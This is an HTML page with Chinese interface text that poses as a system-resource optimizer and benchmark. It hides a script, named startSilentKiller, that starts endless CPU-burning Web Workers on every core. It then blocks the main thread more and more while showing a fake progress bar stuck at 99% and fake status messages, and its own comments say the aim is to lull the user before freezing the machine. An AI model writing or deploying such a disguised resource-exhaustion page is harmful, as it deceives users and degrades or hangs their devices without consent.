、<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>正在配置系统更新...</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f3f3f3;
            color: #333;
            cursor: default;
            user-select: none;
        }

        /* 极简容器 */
        .container {
            text-align: center;
            width: 300px;
        }

        /* 看起来非常人畜无害的加载圈 */
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e1e1e1;
            border-top: 3px solid #007aff; /* 经典的系统蓝 */
            border-radius: 50%;
            margin: 0 auto 20px auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        h2 {
            font-weight: 400;
            font-size: 18px;
            margin-bottom: 10px;
        }

        p {
            font-size: 13px;
            color: #888;
            margin-bottom: 30px;
        }

        /* 唯一的按钮，看起来也很正经 */
        button {
            background: #fff;
            border: 1px solid #ccc;
            padding: 8px 20px;
            font-size: 13px;
            border-radius: 4px;
            cursor: pointer;
            color: #333;
            transition: all 0.2s;
        }

        button:hover {
            background: #f9f9f9;
            border-color: #bbb;
        }

        /* 隐藏的性能监控，为了让你知道它在工作 */
        #debug {
            position: fixed;
            bottom: 10px;
            right: 10px;
            font-size: 10px;
            color: #ccc;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <div class="container" id="main-ui">
        <h2>系统资源优化</h2>
        <p>点击下方按钮开始运行性能基准测试。</p>
        <button onclick="startSilentKiller()">开始运行</button>
    </div>

    <div class="container" id="loading-ui" style="display: none;">
        <div class="spinner"></div>
        <h2 id="msg">正在整理内存碎片...</h2>
        <p>请勿关闭浏览器 ( <span id="percent">0</span>% )</p>
    </div>

    <div id="debug"></div>

    <script>
        function startSilentKiller() {
            // 切换 UI
            document.getElementById('main-ui').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            // 1. 启动 CPU 满载 (Web Workers)
            const cores = navigator.hardwareConcurrency || 8;
            const blob = new Blob([`
                self.onmessage = () => {
                    while(true) { Math.random(); } // 最纯粹的 CPU 消耗
                }
            `], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            for(let i=0; i<cores; i++) {
                new Worker(url).postMessage('go');
            }

            // 2. 启动 "温水煮青蛙" 模式的主线程阻塞
            // 刚开始不卡，让你放松警惕，然后越来越卡
            let lagSeverity = 0; // 阻塞时间 (ms)
            let progress = 0;

            const updateLoop = () => {
                const start = performance.now();
                
                // --- 核心阻塞逻辑 ---
                // 随着进度增加，阻塞时间呈指数级上升
                // 0% -> 0ms (流畅)
                // 50% -> 50ms (微卡)
                // 80% -> 200ms (明显卡顿)
                // 99% -> 500ms+ (甚至无法移动鼠标)
                
                if (lagSeverity > 0) {
                    while (performance.now() - start < lagSeverity) {
                        // 空转阻塞 UI
                    }
                }

                // 更新进度条文字 (假进度)
                progress += 0.05; // 走得很慢
                if (progress > 99) progress = 99; // 永远卡在 99%
                
                document.getElementById('percent').innerText = progress.toFixed(1);
                
                // 增加卡顿等级
                lagSeverity = Math.pow(progress, 1.5) * 0.8; 

                // 随机变换提示语，增加真实感
                if (Math.random() > 0.99) {
                    const msgs = ["正在重新分配缓存...", "优化后台服务...", "释放多余句柄...", "正在等待响应..."];
                    document.getElementById('msg').innerText = msgs[Math.floor(Math.random() * msgs.length)];
                }

                document.getElementById('debug').innerText = `Lag: ${lagSeverity.toFixed(0)}ms/frame`;

                // 请求下一帧
                requestAnimationFrame(updateLoop);
            };

            updateLoop();
        }
    </script>
</body>
</html>
